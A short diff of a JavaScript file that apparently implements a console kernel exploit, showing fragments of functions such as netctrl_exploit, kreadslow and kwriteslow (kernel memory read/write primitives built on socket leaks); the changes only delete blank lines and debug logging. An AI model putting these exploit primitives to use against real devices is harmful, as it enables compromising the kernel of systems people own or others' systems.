@@ -908,7 +908,6 @@ function init_threading() {
 }
 
 var LOG_MAX_LINES = 38;
-
 function setup_log_screen() {
   jsmaf.root.children.length = 0;
 
@@ -967,7 +966,6 @@ function yield_to_render(callback) {
     }
   }, 0);
 }
-
 var exploit_count = 0;
 var exploit_end = false;
 function netctrl_exploit() {
@@ -1770,7 +1768,6 @@ function kreadslow(addr, size) {
     read(new BigInt(iov_sock_0), tmp, 1);
   }
 
-  debug('kreadslow - Reading leak buffers...');
 
   // Wake up all threads.
   read(new BigInt(uio_sock_0), tmp, size);
@@ -1785,7 +1782,6 @@ function kreadslow(addr, size) {
     var val = read64(leak_buffers[_i13]);
     debug('kreadslow - leak_buffers[' + _i13 + ']: ' + hex(val));
     if (!val.eq(tag_val)) {
-      debug('kreadslow - Found valid leak at index ' + _i13 + ', finding triplets[1]...');
       // Find triplet.
       triplets[1] = find_triplet(triplets[0], -1);
       debug('kreadslow - triplets[1]=' + triplets[1]);
@@ -1829,11 +1825,9 @@ function kreadslow(addr, size) {
   return leak_buffer;
 }
 function kwriteslow(addr, buffer, size) {
-  debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size: ' + size);
 
   // حراسة على المدخلات
   if (addr.eq(0) || size <= 0) {
-    log('kwriteslow: invalid addr/size');
     return BigInt_Error;
   }
   if (buffer.eq(0)) {
